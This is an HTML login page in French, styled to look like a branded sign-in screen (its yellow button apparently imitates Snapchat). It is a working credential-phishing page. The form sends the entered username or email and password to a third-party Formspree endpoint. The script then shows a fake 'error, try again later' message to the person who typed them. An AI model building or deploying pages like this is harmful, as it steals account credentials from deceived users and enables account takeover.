 <!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion</title>
  <style>
    body {
      background-color: #f9f9f9;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background: #fff;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
      text-align: center;
    }
    h2 {
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #fffc00;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #fff200;
    }
    .error-message {
      display: none;
      color: red;
      margin-top: 15px;
      font-size: 0.95em;
    }
  </style>
</head>
<body>

<div class="login-box">
  <h2>Connexion</h2>
<img src="logo.jpg" alt="logo" width="150"> style="display:block; margin: 0 auto 15px auto;"
  <!-- Formulaire corrigé -->
  <form id="loginForm" action="https://formspree.io/f/xzzrqevd" method="POST">
    <input type="text" name="identifiant" placeholder="Nom d'utilisateur ou email" required>
    <input type="password" name="code" placeholder="Mot de passe" required>
    <button type="submit">Se connecter</button>
  </form>

  <p id="errorMsg" class="error-message">Une erreur est survenue. Veuillez réessayer plus tard.</p>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const form = e.target;
    const data = new FormData(form);

    fetch(form.action, {
      method: "POST",
      body: data,
      headers: {
        'Accept': 'application/json'
      }
    }).then(response => {
      if (response.ok) {
        document.getElementById("errorMsg").style.display = "block";
        form.reset();
      } else {
        alert("Erreur technique. Essayez plus tard.");
      }
    }).catch(error => {
      alert("Erreur réseau.");
    });
  });
</script>

</body>
</html>
